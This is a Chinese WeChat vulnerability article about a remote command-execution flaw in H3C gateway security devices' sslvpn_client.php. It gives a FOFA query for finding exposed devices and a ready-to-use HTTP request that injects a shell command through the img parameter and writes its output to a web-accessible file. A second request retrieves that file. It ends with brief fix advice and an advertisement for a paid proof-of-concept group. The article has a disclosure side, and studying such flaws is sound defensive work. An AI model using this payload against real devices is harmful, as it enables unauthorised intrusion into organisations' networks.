---
title: 新华三H3C网关-安全设备sslvpn_client.php存在远程命令执行漏洞
url: https://mp.weixin.qq.com/s/BEsdGTHPn7SDM1c1zSKxJQ
source: Doonsec's feed
date: 2026-10-06
fetch_date: 2026-10-07T07:51:46.020778
---

# 新华三H3C网关-安全设备sslvpn_client.php存在远程命令执行漏洞

# 新华三H3C网关-安全设备sslvpn\_client.php存在远程命令执行漏洞

北雪网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**

01

更多内容

#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296

02

搜索引擎

FOFA：body="/webui/images/default/default/alert\_close.jpg"

03

漏洞复现

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzj1MNTP2zQav9asibjvjJfNU0L2Uiben9DHKeD073ovASZhjuCoyk2ibrhvOlIKrCKOdPHDThiaapS8BOqBQVSW4CpuOjBjGdfOLJM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaCEAN5Xib7yqiaWAibqZsFibBEhGq0ExyVujc2bFPnGPQib1wSJKJvVTFNxiaTA8c5d14rOaibqibZaGzkVsCpQsBRfIdXHGCWyibcJt2U/640?wx_fmt=png&from=appmsg)

```
GET /sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp%7Cecho%20%60id%60%20%7Ctee%20/usr/local/webui/sslvpn/859042264.txt HTTP/1.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Connection: closeHost: 127.0.0.1Cache-Control: max-age=0Sec-Ch-Ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "macOS"Upgrade-Insecure-Requests: 1Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzj9cibJ6iaMob64nampm84fjIBfFfqDJT6BPXuOXWKzyjUR74WicojWo6wMQPOxLLxicaOd27v7ppyVga1GunJqKiaefhnA2gvF8A7w/640?wx_fmt=png&from=appmsg)

```
GET /sslvpn/85904226114.txt HTTP/1.1Host:User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgicLRLtfcEDibBnHF8v3MFCj2TUWDibmOyR4fjXiaqv9yW47sLbT98EyNg3OhWlKqz8ILF78naKPKnyib5ltJianqaWy5Se9ny5zVfE/640?wx_fmt=png&from=appmsg)

04

修复建议

1、关闭互联网暴露面或接口设置访问权限

2、升级至安全版本

05

内部圈子

🛠️ 【知名漏洞实战圈，纯干货】🛠️

还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！
目前已更新poc数量2500+

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaUPIP7iaZk5h3RKMHpOIU5Z7uJUlfnjGXoFwvZgcZjY9n1zHsxYJyWtVyZJ7fa3d6aX4aeZCH4sMmkyYj9pSERtpkdW6TPpOaQ/640?wx_fmt=png&from=appmsg)

🎯 适用场景

**▫️渗透测试**▫️企业漏洞自查****▫️****攻防演练****▫️****安全服务****▫️****合规运营****

****![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzhDAjAS53mtu15GoX2t43CddljHVYQLXsNibjNqG2sfoTnUeA5fw8lTmiax0qg4EQ3T9JEQ2iamicFxgicGOoATsna6iberEEzKz4g4o/640?wx_fmt=png&from=appmsg)****

**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**

****▫️**全民掌握网安技能，共守智能时代晴空。**

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjnJSMCbXtribgZvAJkvYkoOvpBvPF0qhoF9YzA6fEqEfv9BgW7zHvsKKlzrgAFaGiaMSJk9eObsFyRqjoKl6QuVVC65jmCxZnSQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过